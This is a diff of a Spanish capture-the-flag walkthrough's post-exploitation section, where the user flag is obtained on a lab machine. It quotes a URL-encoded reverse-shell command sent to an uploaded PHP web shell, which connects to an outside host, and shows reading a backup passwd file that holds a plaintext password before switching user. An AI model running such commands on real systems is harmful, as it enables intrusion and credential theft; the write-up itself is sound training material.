@@ -225,7 +225,7 @@ Ejecutamos nuestro rce y vemos que funciona
         http://10.10.171.9/YouGotTh3P@th/img/rce.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.9.92.151%2F1988%200%3E%261%27
 
 
-## Post Explotacion Escalada de privilegios y obtencion de flags.
+## Post Explotacion Escalada de privilegios www-data to kiran.
 
 -Upgradeamos la reverse shell a full tty para poder trabajar mas comodamente y no perder la conexion
 
@@ -247,9 +247,47 @@ Ejecutamos nuestro rce y vemos que funciona
     
     www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ stty rows 43 columns 174
     www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ stty rows 43 columns 174 
-    www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ 
 
--Obtenemo la flag de usuario
+-Obtenemo la flag de usuario, vemos que hay un usuario llamado kiran pero no tenemos permisos para leer user.txt
+    
+    www-data@ubuntu-xenial:/home/kiran$ ls -la
+    total 28
+    drwxr-xr-x 5 kiran kiran 4096 Dec  9  2020 .
+    drwxr-xr-x 3 root  root  4096 Dec  7  2020 ..
+    -rw------- 1 kiran kiran    0 Dec  9  2020 .bash_history
+    drwx------ 2 kiran kiran 4096 Dec  9  2020 .cache
+    drwxr-x--- 3 kiran kiran 4096 Dec  6  2020 .config
+    drwx------ 2 kiran kiran 4096 Dec  6  2020 .gnupg
+    -rw-r--r-- 1 kiran kiran  670 Dec  9  2020 .profile
+    -r-------- 1 kiran kiran   33 Dec  9  2020 user.txt
+
+Tras listar y enumerar por toda la maquina encontramos un fichero llamdao .bak.passwd, es una copia backup del fichero /etc/passwd donde encontramos la clave del usuario kiran en texto plano.
+
+    www-data@ubuntu-xenial:/var/backups$ cat .bak.passwd 
+    
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    [...]
+    kiran:x:1002:1002:tryth.....ruserkiran:/home/kiran:
+
+Cambiamos de usuario y leemos la user.txt
+
+    www-data@ubuntu-xenial:/var/backups$ su kiran
+    Password: 
+    
+    kiran@ubuntu-xenial:/var/backups$ cat /home/kiran/user.txt 
+    6b18f161;;;;;;;;577c737b7ebc8
+
+
+## Post Explotacion Escalada de privilegios kiran to root.
+
+
+    
+    
+
 
     
 
